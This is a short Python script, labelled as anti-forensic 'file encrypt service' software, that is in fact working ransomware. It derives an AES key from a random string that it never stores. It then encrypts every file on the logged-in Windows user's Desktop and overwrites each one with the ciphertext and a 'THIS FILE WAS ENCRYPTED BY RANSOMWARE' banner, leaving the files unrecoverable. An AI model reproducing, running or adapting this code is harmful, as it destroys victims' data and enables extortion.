"""

Anti-forensic Software
File Encrypt Service
Copyright 2022. sjrjq all rights reserved.

"""

import sys
import base64
import hashlib
from Cryptodome import Random
from Cryptodome.Cipher import AES
import random
import string
import os
import glob

filelist = [None]
n=1024	#key길이 
rand_str = ""	

for i in range(n):
    rand_str += str(random.choice(string.ascii_letters + string.digits))

ENCRYPT_MESSAGE = "THIS FILE WAS ENCRYPTED BY RANSOMWARE.. Copyright 2022. sjrjq all rights reserved. "


BS = 16

pad = lambda s: s + ( BS- len(s.encode('utf-8')) % BS) * chr(BS - len(s.encode('utf-8')) % BS)

unpad = lambda s : s[0:-s[-1]]

key = hashlib.sha256(rand_str.encode()).digest()


def encrypt( raw ):
    raw = pad(raw)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new( key, AES.MODE_CFB, iv)
    return base64.b64encode( iv + cipher.encrypt( raw.encode('utf-8') ))

def encrypt_str( raw ):
    return encrypt(raw).decode('utf-8')

username = format(os.getlogin())

path_dir = 'C:/Users/'+username+'/Desktop/*'
 
for list in glob.glob(path_dir):
    with open(list, 'rb') as infile:
            s3 = infile.readlines()
            a = encrypt_str(str(s3))
            
    with open(list, 'w') as infile2:
        infile2.write(ENCRYPT_MESSAGE + a)

    